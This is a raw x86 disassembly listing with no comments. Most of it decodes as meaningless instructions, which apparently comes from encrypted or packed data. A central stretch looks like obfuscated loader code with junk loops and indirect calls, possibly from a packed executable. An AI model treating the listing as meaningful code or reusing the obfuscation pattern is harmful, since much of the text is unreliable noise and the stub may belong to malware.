  4135e6:	jle    0x4135ed
  4135e8:	inc    edx
  4135e9:	inc    ecx
  4135ea:	ret    0x1705
  4135ed:	sub    bh,BYTE PTR [eax-0x3547dbb3]
  4135f3:	and    DWORD PTR [ecx-0xb],ebx
  4135f6:	bound  ebp,QWORD PTR [edx+esi*4+0x5e82feaa]
  4135fd:	mov    esi,esi
  4135ff:	in     eax,0xc1
  413601:	cmp    dh,BYTE PTR [esi+0xd]
  413604:	add    eax,0x606d3ed6
  413609:	adc    al,0x60
  41360b:	mov    dx,0x2bd6
  41360f:	pop    ss
  413610:	sub    BYTE PTR [esi-0x51145d56],bh
  413616:	xchg   esp,eax
  413617:	test   al,0x77
  413619:	repz pop ss
  41361b:	push   esp
  41361c:	cmp    ecx,esi
  41361e:	enter  0x6e2e,0xd9
  413622:	sar    DWORD PTR [ecx-0x1f],1
  413625:	mov    ecx,DWORD PTR [ecx-0x450d48c4]
  41362b:	and    al,0xc0
  41362d:	lahf   
  41362e:	add    edi,eax
  413630:	mov    edi,0xc26336ab
  413635:	pop    ss
  413636:	ins    BYTE PTR es:[edi],dx
  413637:	sti    
  413638:	xchg   edi,eax
  413639:	adc    edi,DWORD PTR [esi+0x6a]
  41363c:	dec    ebx
  41363d:	push   edx
  41363e:	rol    bh,1
  413640:	daa    
  413641:	out    dx,eax
  413642:	frstor [edx]
  413644:	mov    eax,0xa02d5356
  413649:	aam    0xc5
  41364b:	ins    DWORD PTR es:[edi],dx
  41364c:	not    cl
  41364e:	test   al,0x4e
  413650:	lock mov al,ds:0xf8af3cd
  413656:	retw   0xac7
  41365a:	jge    0x413660
  41365c:	(bad)  
  41365d:	sbb    ebx,esp
  41365f:	test   bl,al
  413661:	xor    al,ch
  413663:	mov    ds:0xd40ca2c5,eax
  413668:	cmp    al,0x5d
  41366a:	add    BYTE PTR [edx+0x716d047],0xed
  413671:	mov    DWORD PTR [edi+esi*4+0x1d996359],ebx
  413678:	and    al,0xe8
  41367a:	inc    esi
  41367b:	repz int3 
  41367d:	jp     0x4136b9
  41367f:	cmp    eax,0xcb8924de
  413684:	and    DWORD PTR [ebx-0x7875b703],eax
  41368a:	(bad)  
  41368b:	gs pop esi
  41368d:	les    ecx,FWORD PTR [edi-0xefa4376]
  413693:	retf   
  413694:	mov    edx,0xd4d84959
  413699:	pop    ecx
  41369a:	test   al,0x5b
  41369c:	lea    eax,[ebx-0x4f]
  41369f:	sbb    BYTE PTR [ecx],dh
  4136a1:	stc    
  4136a2:	mov    bl,0x42
  4136a4:	lds    esp,FWORD PTR [ebp-0xc]
  4136a7:	out    0x87,al
  4136a9:	sbb    eax,0x2c420931
  4136ae:	xor    al,0x4a
  4136b0:	clc    
  4136b1:	mov    ecx,0x33314e2
  4136b6:	scas   eax,DWORD PTR es:[edi]
  4136b7:	imul   ebx,DWORD PTR [ebp+0x13f24704],0x67
  4136be:	push   edx
  4136bf:	(bad)  
  4136c0:	push   ebx
  4136c1:	inc    ax
  4136c3:	pop    ecx
  4136c4:	fimul  DWORD PTR [edi+0x26]
  4136c7:	jl     0x4136b6
  4136c9:	in     al,0x38
  4136cb:	in     eax,0xa5
  4136cd:	loope  0x41365f
  4136cf:	fs jno 0x413680
  4136d2:	push   ecx
  4136d3:	not    BYTE PTR [ebx+0x52]
  4136d6:	mov    ch,0x5
  4136d8:	in     al,dx
  4136d9:	mov    cl,0x57
  4136db:	pusha  
  4136dc:	xchg   ebx,eax
  4136dd:	pop    edi
  4136de:	jl     0x4136b8
  4136e0:	inc    edx
  4136e1:	fsub   st(6),st
  4136e3:	xor    eax,0x48fd9d91
  4136e8:	xlat   BYTE PTR ds:[ebx]
  4136e9:	jbe    0x4136a3
  4136eb:	out    0xc2,eax
  4136ed:	ficomp WORD PTR [ebx+0x2]
  4136f0:	jge    0x413745
  4136f2:	add    DWORD PTR [eax-0xd],esp
  4136f5:	mov    BYTE PTR [eax+0x18a4bcc5],dh
  4136fb:	xchg   BYTE PTR [ecx+ebp*2],ch
  4136fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136ff:	adc    eax,0xf0a659d
  413704:	mov    DWORD PTR [edi+esi*8+0x6c],esi
  413708:	push   ecx
  413709:	pop    esp
  41370a:	adc    ebx,DWORD PTR [eax-0x62]
  41370d:	xchg   edi,eax
  41370e:	ss aaa 
  413710:	jp     0x4136f4
  413712:	pop    ds
  413713:	mov    WORD PTR ds:0xab195bbf,cs
  413719:	jno    0x413718
  41371b:	leave  
  41371c:	sahf   
  41371d:	dec    eax
  41371e:	adc    DWORD PTR [ebp-0x13],ebx
  413721:	lds    eax,FWORD PTR [ebx]
  413723:	imul   edi,DWORD PTR [eax],0x5b15a31f
  413729:	adc    al,0xce
  41372b:	cmp    al,0x98
  41372d:	mov    ds:0xa312ee38,eax
  413732:	scas   al,BYTE PTR es:[edi]
  413733:	add    BYTE PTR [ebx*8+0x3785798f],ch
  41373a:	ret    
  41373b:	adc    esp,DWORD PTR [edx]
  41373d:	loopne 0x4137b8
  41373f:	adc    esi,edi
  413741:	ficom  WORD PTR [edi+0x61a2c60]
  413747:	(bad)  
  413748:	rol    BYTE PTR [edx+0x0],1
  41374b:	cdq    
  41374c:	nop
  41374d:	inc    ebx
  41374e:	and    al,0xa9
  413750:	test   bl,0xbb
  413753:	inc    esi
  413754:	cmp    eax,0x594c49c8
  413759:	xchg   BYTE PTR [ebx-0x3385496d],bh
  41375f:	push   ebx
  413760:	push   cs
  413761:	test   dh,dh
  413763:	bndldx bnd3,[eax]
  413766:	push   edx
  413767:	or     al,0xb8
  413769:	std    
  41376a:	push   0x30193fcb
  41376f:	fild   WORD PTR [ebx+0x146bb9dd]
  413775:	mov    ah,0x19
  413777:	adc    dh,BYTE PTR fs:[ebp-0x208a6a44]
  41377e:	addr16 leave 
  413780:	das    
  413781:	inc    ebx
  413782:	repnz adc ch,ch
  413785:	mov    eax,0xdb0fe545
  41378a:	pop    edi
  41378b:	test   al,0xda
  41378d:	pop    es
  41378e:	xor    eax,0xb788826e
  413793:	xchg   ebx,eax
  413794:	jno    0x4137e5
  413796:	nop
  413797:	mov    ah,0x49
  413799:	xor    al,cl
  41379b:	aaa    
  41379c:	sbb    al,0x43
  41379e:	push   esp
  41379f:	mov    dl,0xc8
  4137a1:	jle    0x413738
  4137a3:	push   ss
  4137a4:	in     eax,0xf
  4137a6:	or     DWORD PTR [edx],edi
  4137a8:	imul   esp,DWORD PTR [edx+0x76],0x75dc8211
  4137af:	dec    ecx
  4137b0:	sti    
  4137b1:	sub    BYTE PTR ds:0x86881a16,0x18
  4137b8:	shl    DWORD PTR [ebp-0x14eb0772],1
  4137be:	sbb    al,0xe7
  4137c0:	dec    edi
  4137c1:	pop    ebx
  4137c2:	das    
  4137c3:	mov    al,ds:0x7c89a065
  4137c8:	adc    DWORD PTR [ebp+0x7b1c33d6],esp
  4137ce:	mov    esp,0xcc057291
  4137d3:	stos   BYTE PTR es:[edi],al
  4137d4:	iret   
  4137d5:	mov    bh,0xc8
  4137d7:	pop    ebx
  4137d8:	or     DWORD PTR [ebp+esi*4-0x74282973],0xbdd46c92
  4137e3:	test   al,0x51
  4137e5:	inc    ebp
  4137e6:	repnz in al,dx
  4137e8:	mov    ds:0x62b8aff6,al
  4137ed:	and    al,0xa3
  4137ef:	pop    ss
  4137f0:	fisttp WORD PTR [ecx-0x1622e6e0]
  4137f6:	aaa    
  4137f7:	mov    dl,0x1e
  4137f9:	jecxz  0x413797
  4137fb:	(bad)
  4137fe:	mov    WORD PTR [ebx-0x5ca58f2b],gs
  413804:	sub    ecx,DWORD PTR [eax-0x4e]
  413807:	xchg   ebp,eax
  413808:	fs pop es
  41380a:	xor    esi,esi
  41380c:	sub    eax,0x1a0d4fa1
  413811:	push   0x76
  413813:	cwde   
  413814:	test   DWORD PTR [esp+eax*4],edx
  413817:	push   edx
  413818:	inc    ebx
  413819:	or     eax,0x6d48c008
  41381e:	rcr    DWORD PTR [eax],cl
  413820:	xchg   edi,eax
  413821:	xchg   ecx,eax
  413822:	mov    BYTE PTR [esi+0x66d8847f],al
  413828:	xchg   BYTE PTR [ebx+0xb],bl
  41382b:	pushf  
  41382c:	je     0x413890
  41382e:	lods   al,BYTE PTR ds:[esi]
  41382f:	out    dx,eax
  413830:	mov    edx,DWORD PTR [eax+0x10659484]
  413836:	into   
  413837:	out    dx,eax
  413838:	jb     0x413878
  41383a:	mov    dh,0x71
  41383c:	fmul   st(4),st
  41383e:	mov    dh,0x47
  413840:	pop    edx
  413841:	mov    edx,0x3d120fa2
  413846:	inc    eax
  413847:	adc    ah,BYTE PTR [esi-0xf]
  41384a:	jae    0x4138b9
  41384c:	push   edi
  41384d:	xchg   edi,eax
  41384e:	mov    ecx,0xc2b7c180
  413853:	arpl   WORD PTR [edx+0x1f],cx
  413856:	xor    al,0xe8
  413858:	mov    al,ds:0x5ef0da26
  41385d:	and    cl,BYTE PTR [ecx]
  41385f:	or     BYTE PTR [ecx-0x16],cl
  413862:	push   edi
  413863:	mov    ebx,0x37c60790
  413868:	cmp    eax,DWORD PTR [ebx+0x65]
  41386b:	sub    eax,0xaf416ff2
  413870:	cwde   
  413871:	xor    edi,DWORD PTR [ecx+0x4ee18f60]
  413877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413878:	adc    al,0xb8
  41387a:	call   0x56a174a7
  41387f:	mov    ebp,DWORD PTR [esi+0x4c]
  413882:	push   ebx
  413883:	mov    esi,0xbcf59927
  413888:	pop    esi
  413889:	(bad)  
  41388a:	mov    ebx,0x1a560a9f
  41388f:	mov    edx,0xa82ef4dc
  413894:	mov    ebx,0x867e728e
  413899:	mov    ebx,0x303ec613
  41389e:	pop    esp
  41389f:	adc    BYTE PTR [edx],bh
  4138a1:	mov    esp,0xdd2a98fb
  4138a6:	cmp    BYTE PTR [eax],0xac
  4138a9:	retf   0xaa18
  4138ac:	sbb    BYTE PTR [esi+edi*2+0x2498bf93],ch
  4138b3:	adc    eax,0xed058ed4
  4138b8:	adc    eax,0x8f2334ce
  4138bd:	sti    
  4138be:	aaa    
  4138bf:	sbb    eax,0xaa6aff4e
  4138c4:	aad    0xef
  4138c6:	pop    ebp
  4138c7:	movd   DWORD PTR [esi+0x33f447de],mm5
  4138ce:	clc    
  4138cf:	xor    al,0xcc
  4138d1:	jmp    0x413939
  4138d3:	or     al,0x55
  4138d5:	mov    edi,0xfe575ea
  4138da:	jp     0x413896
  4138dc:	fcom   st(4)
  4138de:	and    BYTE PTR [eax],bl
  4138e0:	stos   DWORD PTR es:[edi],eax
  4138e1:	outs   dx,BYTE PTR ds:[esi]
  4138e2:	js     0x413917
  4138e4:	fadd   DWORD PTR [ecx+0x42b01c25]
  4138ea:	add    BYTE PTR [esi+0x4e],ah
  4138ed:	add    BYTE PTR [eax],al
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413cc3
  413cce:	dec    edi
  413ccf:	ds mov eax,0x7c7c8a14
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	fisttp DWORD PTR [ebx+0x54645626]
  413cdf:	lods   al,BYTE PTR ds:[esi]
  413ce0:	pop    edi
  413ce1:	sar    BYTE PTR [edx-0x39],cl
  413ce4:	xchg   ecx,eax
  413ce5:	arpl   WORD PTR [eax+0x5e68bbe8],ax
  413ceb:	ficomp WORD PTR [edi-0x4234b9fa]
  413cf1:	mov    edi,0x1df65ec4
  413cf6:	adc    BYTE PTR [eax-0x14f0b57c],al
  413cfc:	cmp    BYTE PTR [ebp-0x6b4230c7],cl
  413d02:	xchg   ebx,eax
  413d03:	pop    ss
  413d04:	(bad)  
  413d05:	and    eax,0xf34a554d
  413d0a:	sub    al,0x68
  413d0c:	xlat   BYTE PTR ds:[ebx]
  413d0d:	xchg   ebx,eax
  413d0e:	adc    DWORD PTR [ecx],esp
  413d10:	mov    bh,0x72
  413d12:	shl    BYTE PTR [edi+0x40],cl
  413d15:	cmp    ch,dl
  413d17:	pop    ss
  413d18:	scas   eax,DWORD PTR es:[edi]
  413d19:	mov    BYTE PTR [esi-0x6915d8f7],cl
  413d1f:	(bad)  
  413d20:	xor    ah,BYTE PTR [ecx+edx*2]
  413d23:	jmp    0x413d60
  413d25:	or     eax,0x1ec2117
  413d2a:	dec    edi
  413d2b:	jae    0x413d4a
  413d2d:	imul   ebx
  413d2f:	les    esi,FWORD PTR [edi+0x5c092721]
  413d35:	or     al,BYTE PTR [eax+ebx*2]
  413d38:	rcl    DWORD PTR [esi+0x12],1
  413d3b:	adc    ch,BYTE PTR [ebx]
  413d3d:	retf   
  413d3e:	pop    esp
  413d3f:	ror    DWORD PTR [ecx+0x1bb9dbf5],cl
  413d45:	push   0xd2ce474d
  413d4a:	adc    al,0xd3
  413d4c:	jne    0x413dbb
  413d4e:	(bad)  
  413d4f:	push   ds
  413d50:	ss jb  0x413d88
  413d53:	imul   edi,DWORD PTR [ebp+0x1729d92c],0x3c628c05
  413d5d:	sub    bh,BYTE PTR [esp+edx*1+0x4e6e6ed3]
  413d64:	out    dx,al
  413d65:	aad    0x1b
  413d67:	add    al,0x52
  413d69:	jl     0x413d30
  413d6b:	add    bl,al
  413d6d:	mov    ds:0x74a1e17,eax
  413d72:	fcom   DWORD PTR [eax+0x50b15f87]
  413d78:	ret    0x3587
  413d7b:	in     eax,dx
  413d7c:	jbe    0x413d15
  413d7e:	frstor [ecx-0x4c]
  413d81:	cwde   
  413d82:	mov    dl,0x10
  413d84:	arpl   WORD PTR [eax-0x24],bp
  413d87:	ss out 0x65,al
  413d8a:	sbb    eax,0xa19cb1b9
  413d8f:	and    bl,BYTE PTR [edx]
  413d91:	lds    ecx,FWORD PTR [esi-0x48]
  413d94:	push   edx
  413d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d96:	xor    BYTE PTR [eax],0xf5
  413d99:	push   es
  413d9a:	test   DWORD PTR [edx],0xabd6c7c0
  413da0:	and    edx,eax
  413da2:	push   0xf62cc495
  413da7:	sub    eax,0x23b34701
  413dac:	into   
  413dad:	adc    eax,0xf1e2f667
  413db2:	xchg   ebp,eax
  413db3:	mov    esi,0x76cc68ac
  413db8:	push   ecx
  413db9:	in     al,0x8a
  413dbb:	sbb    eax,0x82eb7aa4
  413dc0:	push   ebx
  413dc1:	ja     0x413d81
  413dc3:	stc    
  413dc4:	mov    DWORD PTR [edi],eax
  413dc6:	mov    ebp,0x40d94d3a
  413dcb:	mov    eax,0xaea3a6d6
  413dd0:	iret   
  413dd1:	dec    esp
  413dd2:	nop
  413dd3:	push   ebx
  413dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dd5:	xchg   edi,eax
  413dd6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413dd8:	or     cl,BYTE PTR [edi+esi*1+0x42c681ab]
  413ddf:	lahf   
  413de0:	mov    esp,es
  413de2:	shr    DWORD PTR [edi+0x5c],cl
  413de5:	pop    esi
  413de6:	int    0x46
  413de8:	push   0x8c49ded
  413ded:	test   al,0x79
  413def:	lds    ebx,FWORD PTR [eax]
  413df1:	xchg   BYTE PTR ds:0x6e775eb8,cl
  413df7:	fst    DWORD PTR [edi-0x73]
  413dfa:	jb     0x413d90
  413dfc:	sub    dh,ah
  413dfe:	lock data16 daa 
  413e01:	mov    esp,edi
  413e03:	fcom   QWORD PTR [ecx+0x6ab9ac23]
  413e09:	inc    edi
  413e0a:	jno    0x413de9
  413e0c:	push   ebp
  413e0d:	jmp    0x413dcf
  413e0f:	mov    ebx,0x4acf091d
  413e14:	stos   BYTE PTR es:[edi],al
  413e15:	psubq  mm4,QWORD PTR ss:[edi]
  413e19:	push   ss
  413e1a:	aaa    
  413e1b:	scas   eax,DWORD PTR es:[edi]
  413e1c:	mov    WORD PTR [esi+0x29],es
  413e1f:	int3   
  413e20:	test   BYTE PTR [ebp+0x36],dl
  413e23:	inc    BYTE PTR [ebp+0x7b]
  413e26:	iret   
  413e27:	out    0x66,al
  413e29:	xor    dl,bl
  413e2b:	adc    DWORD PTR [esp+eax*4+0x773b7041],eax
  413e32:	adc    eax,DWORD PTR [esi+0x32]
  413e35:	jge    0x413df3
  413e37:	mov    esp,0xd1af3a89
  413e3c:	adc    eax,DWORD PTR [ebx-0x26ffde9c]
  413e42:	mov    al,0x69
  413e44:	pop    ebx
  413e45:	and    al,bh
  413e47:	dec    edi
  413e48:	xchg   edi,eax
  413e49:	or     ebp,DWORD PTR [ecx+0x2a]
  413e4c:	or     bl,dh
  413e4e:	adc    esp,edx
  413e50:	call   0x856a537b
  413e55:	mov    ecx,DWORD PTR [edx+0xbb48fee]
  413e5b:	jmp    0x413eb5
  413e5d:	sub    DWORD PTR [edx],eax
  413e5f:	retf   
  413e60:	pop    DWORD PTR gs:[esi+eax*1+0x10d56d62]
  413e68:	and    edx,DWORD PTR [ebp-0xe9e81ac]
  413e6e:	pop    edi
  413e6f:	and    eax,0x286c3927
  413e74:	lods   al,BYTE PTR ds:[esi]
  413e75:	shr    DWORD PTR [edx],0xd0
  413e78:	sti    
  413e79:	pop    ebp
  413e7a:	pop    ebx
  413e7b:	mov    ebx,0x2790a89d
  413e80:	mov    edi,0xc30160a9
  413e85:	fwait
  413e86:	jne    0x413ebf
  413e88:	mov    eax,ds:0x3750942f
  413e8d:	pop    ebp
  413e8e:	scas   eax,DWORD PTR es:[edi]
  413e8f:	pusha  
  413e90:	loopne 0x413e46
  413e92:	cmp    DWORD PTR [esi],ebx
  413e94:	push   0xffffff93
  413e96:	xchg   BYTE PTR [ebx+ebx*1],dl
  413e99:	pop    ecx
  413e9a:	mov    BYTE PTR [edx],dl
  413e9c:	dec    edi
  413e9d:	or     DWORD PTR [edx-0x59c9376],ecx
  413ea3:	je     0x413ed2
  413ea5:	xor    BYTE PTR [eax],dh
  413ea7:	xor    al,0x5e
  413ea9:	mov    dh,0xaa
  413eab:	pop    ecx
  413eac:	int    0xc9
  413eae:	push   0xffffffd9
  413eb0:	aad    0xa3
  413eb2:	scas   al,BYTE PTR es:[edi]
  413eb3:	and    eax,0x11c2410f
  413eb8:	test   DWORD PTR [ecx],ebx
  413eba:	fisttp WORD PTR [eax+0x10c7bef4]
  413ec0:	int    0xa2
  413ec2:	pop    ecx
  413ec3:	add    bl,BYTE PTR [ebx-0x68]
  413ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ec7:	repnz repz cmp esi,esi
  413ecb:	pop    ebp
  413ecc:	and    BYTE PTR [ebp+0x6],bh
  413ecf:	ja     0x413eb8
  413ed1:	inc    edx
  413ed2:	jo     0x413e6f
  413ed4:	in     al,dx
  413ed5:	pusha  
  413ed6:	jl     0x413eb8
  413ed8:	push   ebp
  413ed9:	mov    ebx,0xb160f4a9
  413ede:	adc    DWORD PTR [edi+0x7c],edx
  413ee1:	ret    
  413ee2:	jmp    0x7a83:0xb681c06b
  413ee9:	push   edx
  413eea:	aad    0xf
  413eec:	(bad)  
  413eed:	mov    al,0xc4
  413eef:	push   ecx
  413ef0:	push   ebp
  413ef1:	xor    DWORD PTR [edx+0x4c76301e],eax
  413ef7:	shr    DWORD PTR [edx+eiz*4+0x1c],1
  413efb:	push   esp
  413efc:	scas   al,BYTE PTR es:[edi]
  413efd:	mov    edx,0xf0f4464a
  413f02:	and    DWORD PTR [edx],ebp
  413f04:	add    esi,DWORD PTR ds:0x5bfd56e5
  413f0a:	or     al,0x21
  413f0c:	mov    al,0xf8
  413f0e:	scas   eax,DWORD PTR es:[edi]
  413f0f:	add    cl,BYTE PTR [bx+si-0x679]
  413f14:	and    al,0x4b
  413f16:	sbb    BYTE PTR [esi+ebx*8-0x32],bh
  413f1a:	pop    ebx
  413f1b:	push   ss
  413f1c:	jo     0x413f6f
  413f1e:	ficomp WORD PTR [eax]
  413f20:	jnp    0x413f24
  413f22:	das    
  413f23:	xor    ecx,ebp
  413f25:	addr16 cli 
  413f27:	test   BYTE PTR [ebp+eiz*2-0x221bd921],dl
  413f2e:	rcr    BYTE PTR [ebx-0x3e79a0ed],0x40
  413f35:	dec    eax
  413f36:	gs icebp 
  413f38:	jo     0x413f56
  413f3a:	mov    al,0x14
  413f3c:	enter  0x17ae,0xc2
  413f40:	out    0xdc,eax
